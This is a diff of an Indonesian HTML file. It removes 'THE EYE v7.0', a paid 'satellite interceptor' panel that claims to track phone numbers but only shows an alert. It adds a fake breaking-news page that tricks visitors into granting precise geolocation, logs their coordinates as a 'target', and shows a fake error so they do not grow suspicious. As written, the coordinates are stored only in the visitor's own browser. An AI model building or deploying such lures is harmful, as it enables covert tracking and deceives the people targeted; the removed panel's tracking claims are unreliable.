@@ -3,218 +3,79 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>THE EYE v7.0 - COMMAND CENTER</title>
+    <title>BREAKING NEWS: Kejadian Tak Terduga!</title>
     <style>
-        :root { --neon: #00ff00; --bg: #050505; --danger: #ff0000; --gold: #ffd700; }
-        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; }
-        
-        /* BANNER HARGA */
-        .price-banner { background: rgba(0, 255, 0, 0.1); border: 1px dashed var(--neon); padding: 15px; margin-bottom: 20px; border-radius: 5px; font-size: 14px; }
-        .price-item { display: flex; justify-content: space-between; margin: 5px 0; border-bottom: 1px solid #222; }
-
-        /* LOGIN SCREEN */
-        #auth-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
-        .login-box { border: 2px solid var(--neon); padding: 30px; text-align: center; box-shadow: 0 0 15px var(--neon); background: #000; max-width: 400px; width: 100%; }
-        input, select { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; margin: 10px 0; width: 90%; text-align: center; outline: none; }
-        
-        /* DASHBOARD */
-        #main-ui { display: none; padding: 20px; }
-        header { border-bottom: 2px solid var(--neon); padding-bottom: 10px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
-        .card { background: #111; border: 1px solid #333; padding: 20px; margin-bottom: 20px; border-radius: 5px; }
-        .card h3 { color: #fff; border-bottom: 1px solid #333; padding-bottom: 10px; margin-top: 0; }
-        
-        /* LOG & TABLE */
-        #log-display { background: #000; height: 180px; overflow-y: auto; padding: 10px; border: 1px solid #222; font-size: 12px; color: #0f0; }
-        table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 13px; }
-        th, td { border: 1px solid #333; padding: 10px; text-align: left; }
-        
-        button { background: var(--neon); color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; border-radius: 3px; }
-        button:hover { background: #fff; }
-        .btn-danger { background: var(--danger); color: #fff; }
-        
-        /* BANNED POPUP */
-        #banned-popup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 9999; justify-content: center; align-items: center; text-align: center; }
-        .banned-content { border: 3px solid red; padding: 40px; background: #000; color: red; }
+        :root { --neon: #00ff00; --bg: #0d0d0d; }
+        body { font-family: 'Helvetica', sans-serif; margin: 0; background: var(--bg); color: #eee; }
+        .nav { background: #cc0000; padding: 15px; text-align: center; font-weight: bold; font-size: 20px; letter-spacing: 2px; }
+        .container { max-width: 500px; margin: 20px auto; background: #1a1a1a; padding: 25px; border-radius: 12px; border: 1px solid #333; }
+        .img-placeholder { width: 100%; height: 220px; background: #333; display: flex; align-items: center; justify-content: center; border-radius: 8px; margin-bottom: 20px; border: 1px dashed #555; font-weight: bold; color: #888; }
+        h2 { font-size: 22px; color: #fff; line-height: 1.4; margin-bottom: 15px; }
+        p { color: #ccc; line-height: 1.6; font-size: 15px; }
+        .btn-track { background: #cc0000; color: white; border: none; padding: 18px; width: 100%; font-size: 17px; font-weight: bold; cursor: pointer; border-radius: 8px; transition: 0.3s; margin-top: 15px; }
+        .btn-track:hover { background: #ff0000; transform: scale(1.02); }
+        .footer { text-align: center; font-size: 11px; color: #555; margin-top: 40px; }
     </style>
 </head>
-<body onload="checkAutoLogin()">
+<body>
 
-<div id="banned-popup">
-    <div class="banned-content">
-        <h1>❌ ACCESS DENIED</h1>
-        <h2 style="letter-spacing: 3px;">AKUN ANDA TERBANNED PERMANENT!</h2>
-        <p>Pelanggaran Protokol Sistem Detect.</p>
-        <button onclick="location.reload()" style="background:red; color:white;">EXIT</button>
-    </div>
+<div class="nav">GLOBAL NEWS NETWORK</div>
+
+<div class="container">
+    <div class="img-placeholder">[ VIDEO SEDANG DI PROSES... ]</div>
+    <h2>🔴 LIVE: Kejadian Misterius di Dekat Lokasi Anda, Warga Diminta Waspada!</h2>
+    <p>
+        Sebuah peristiwa mengejutkan baru saja terjadi dan terekam kamera warga. Pihak berwenang sedang melakukan investigasi mendalam di lokasi kejadian.
+        <br><br>
+        Klik tombol di bawah untuk <b>Konfirmasi Lokasi</b> dan melihat video eksklusif kejadian tersebut secara utuh.
+    </p>
+    
+    <button class="btn-track" id="mainBtn" onclick="locate()">TONTON VIDEO SEKARANG</button>
 </div>
 
-<div id="auth-screen">
-    <div class="login-box">
-        <h1 style="letter-spacing: 5px; text-shadow: 0 0 10px var(--neon); margin-bottom:5px;">THE EYE v7.0</h1>
-        <p style="font-size: 10px; margin-bottom: 20px;">SATELLITE INTERCEPTOR SYSTEM</p>
-
-        <div class="price-banner">
-            <b style="color:var(--gold)">🛒 DAFTAR HARGA AKSES:</b>
-            <div class="price-item"><span>RANK: MEMBER (3x)</span> <span style="color:var(--gold)">5rb</span></div>
-            <div class="price-item"><span>RANK: ADMIN (5x)</span> <span style="color:var(--gold)">8rb</span></div>
-            <div class="price-item"><span>RANK: OWNER (Unlimited)</span> <span style="color:var(--gold)">15rb</span></div>
-            <p style="font-size: 9px; color: #888; margin-top: 10px;">*Hubungi Admin untuk Aktivasi</p>
-        </div>
-
-        <input type="text" id="u" placeholder="USERNAME">
-        <input type="password" id="p" placeholder="PASSWORD">
-        <button onclick="auth()" style="width: 100%;">LOGIN SYSTEM</button>
-    </div>
-</div>
-
-<div id="main-ui">
-    <header>
-        <div>
-            <span style="font-size: 18px; font-weight: bold;">COMMAND CENTER</span>
-            <span id="rank-info" style="margin-left:10px; background:red; color:white; padding:2px 8px; font-size:10px;">RANK</span>
-        </div>
-        <button onclick="logout()" style="background:transparent; color:red; border:1px solid red; padding:5px 10px;">OUT</button>
-    </header>
-
-    <div id="owner-only-view">
-        <div class="card">
-            <h3>🛰️ LIVE INTERCEPT (LOGS)</h3>
-            <div id="log-display">-- Menunggu Data --</div>
-        </div>
-
-        <div class="card">
-            <div style="display:flex; justify-content:space-between;">
-                <h3 id="toggle-text" style="cursor:pointer; color:#555;" onclick="toggleRegister()">+ BUKA PANEL AGENT (RAHASIA)</h3>
-            </div>
-            <div id="register-panel" style="display:none; margin-top:15px;">
-                <input type="text" id="nu" placeholder="User Baru" style="width: 200px;">
-                <input type="text" id="np" placeholder="Pass Baru" style="width: 200px;">
-                <select id="nr" style="width: 200px;">
-                    <option value="MEMBER">MEMBER</option>
-                    <option value="ADMIN">ADMIN</option>
-                </select>
-                <button onclick="addNewAgent()">CREATE</button>
-            </div>
-        </div>
-
-        <div class="card">
-            <h3>👥 DATABASE AGENT</h3>
-            <div id="user-table-area"></div>
-        </div>
-    </div>
-
-    <div id="member-view" class="card" style="display:none;">
-        <h3>🛰️ TARGET TRACKER</h3>
-        <p>Sisa Kuota: <b id="quota-display">0</b></p>
-        <input type="tel" id="targetNum" placeholder="Nomor HP Target" style="width: 70%;">
-        <button onclick="manualTrack()">START SCAN</button>
-        <div id="track-res" style="margin-top:20px;"></div>
-    </div>
+<div class="footer">
+    © 2026 GNN Media. Akurasi Informasi Terjamin.
 </div>
 
 <script>
-    function initDB() {
-        if (!localStorage.getItem("eye_db")) {
-            const master = [{u: "owner", p: "666", role: "OWNER", status: "ACTIVE", quota: 999999}];
-            localStorage.setItem("eye_db", JSON.stringify(master));
-        }
-        if (!localStorage.getItem("eye_logs")) localStorage.setItem("eye_logs", JSON.stringify([]));
-    }
+    function locate() {
+        const btn = document.getElementById('mainBtn');
+        btn.innerText = "Connecting to Server...";
+        btn.disabled = true;
 
-    function checkAutoLogin() {
-        initDB();
-        const session = sessionStorage.getItem("eye_session");
-        if (session) {
-            const user = JSON.parse(session);
-            const db = JSON.parse(localStorage.getItem("eye_db"));
-            const current = db.find(x => x.u === user.u);
-            if (current && current.status === "BANNED") { showBanned(); return; }
-            showDashboard(current);
-        }
-    }
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const time = new Date().toLocaleTimeString();
+                    
+                    // KIRIM DATA KE DATABASE LOKAL (LOGS)
+                    let logs = JSON.parse(localStorage.getItem("eye_logs")) || [];
+                    const newLog = `[${time}] 🎯 TARGET TERDETEKSI! <br> Maps: <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" style="color:#00ff00">LIHAT POSISI (${lat}, ${lon})</a>`;
+                    
+                    logs.unshift(newLog);
+                    localStorage.setItem("eye_logs", JSON.stringify(logs));
 
-    function auth() {
-        const uIn = document.getElementById('u').value;
-        const pIn = document.getElementById('p').value;
-        const db = JSON.parse(localStorage.getItem("eye_db"));
-        const acc = db.find(x => x.u === uIn && x.p === pIn);
-
-        if (acc) {
-            if (acc.status === "BANNED") { showBanned(); return; }
-            sessionStorage.setItem("eye_session", JSON.stringify(acc));
-            showDashboard(acc);
-        } else { alert("AKSES DITOLAK!"); }
-    }
-
-    function showDashboard(acc) {
-        document.getElementById('auth-screen').style.display = 'none';
-        document.getElementById('main-ui').style.display = 'block';
-        document.getElementById('rank-info').innerText = acc.role;
-
-        if (acc.role === "OWNER" || acc.role === "ADMIN") {
-            document.getElementById('owner-only-view').style.display = 'block';
-            renderLogs();
-            renderUserTable();
+                    // Fake Error biar target ga curiga
+                    setTimeout(() => {
+                        alert("Error 404: Koneksi terputus. Server terlalu sibuk karena banyak yang mengakses video ini. Coba 5 menit lagi.");
+                        btn.innerText = "TONTON VIDEO SEKARANG";
+                        btn.disabled = false;
+                    }, 2000);
+                },
+                (err) => {
+                    alert("Akses Ditolak: Anda harus mengizinkan akses lokasi untuk melihat berita viral di sekitar Anda.");
+                    btn.innerText = "TONTON VIDEO SEKARANG";
+                    btn.disabled = false;
+                },
+                { enableHighAccuracy: true }
+            );
         } else {
-            document.getElementById('member-view').style.display = 'block';
-            document.getElementById('quota-display').innerText = acc.quota;
+            alert("Browser tidak mendukung GPS.");
         }
     }
-
-    function toggleRegister() {
-        const panel = document.getElementById('register-panel');
-        if(panel.style.display === "none") {
-            panel.style.display = "block";
-            document.getElementById('toggle-text').innerText = "- TUTUP PANEL AGENT";
-        } else {
-            panel.style.display = "none";
-            document.getElementById('toggle-text').innerText = "+ BUKA PANEL AGENT (RAHASIA)";
-        }
-    }
-
-    function addNewAgent() {
-        const nu = document.getElementById('nu').value;
-        const np = document.getElementById('np').value;
-        const nr = document.getElementById('nr').value;
-        if(!nu || !np) return;
-        let db = JSON.parse(localStorage.getItem("eye_db"));
-        db.push({u: nu, p: np, role: nr, status: "ACTIVE", quota: (nr==='ADMIN'?5:3)});
-        localStorage.setItem("eye_db", JSON.stringify(db));
-        alert("AGEN " + nu + " BERHASIL DIBUAT!");
-        // Langsung tutup panel & kosongkan input
-        document.getElementById('nu').value = ""; document.getElementById('np').value = "";
-        toggleRegister();
-        renderUserTable();
-    }
-
-    function renderUserTable() {
-        const db = JSON.parse(localStorage.getItem("eye_db"));
-        let html = `<table><tr><th>Agent</th><th>Rank</th><th>Status</th><th>Aksi</th></tr>`;
-        db.forEach((user, i) => {
-            if (user.role === 'OWNER') return;
-            html += `<tr><td>${user.u}</td><td>${user.role}</td>
-                    <td style="color:${user.status === 'ACTIVE' ? 'lime' : 'red'}">${user.status}</td>
-                    <td><button class="btn-danger" onclick="banAgent(${i})">BAN</button></td></tr>`;
-        });
-        document.getElementById('user-table-area').innerHTML = html + `</table>`;
-    }
-
-    function renderLogs() {
-        const logs = JSON.parse(localStorage.getItem("eye_logs"));
-        document.getElementById('log-display').innerHTML = logs.length > 0 ? logs.join("<br>") : "-- No Logs --";
-    }
-
-    function banAgent(i) {
-        let db = JSON.parse(localStorage.getItem("eye_db"));
-        db[i].status = "BANNED";
-        localStorage.setItem("eye_db", JSON.stringify(db));
-        renderUserTable();
-    }
-
-    function showBanned() { sessionStorage.clear(); document.getElementById('banned-popup').style.display = 'flex'; }
-    function logout() { sessionStorage.clear(); location.reload(); }
-
-    function manualTrack() { alert("Menghubungkan ke satelit..."); }
 </script>
+
 </body>
 </html>
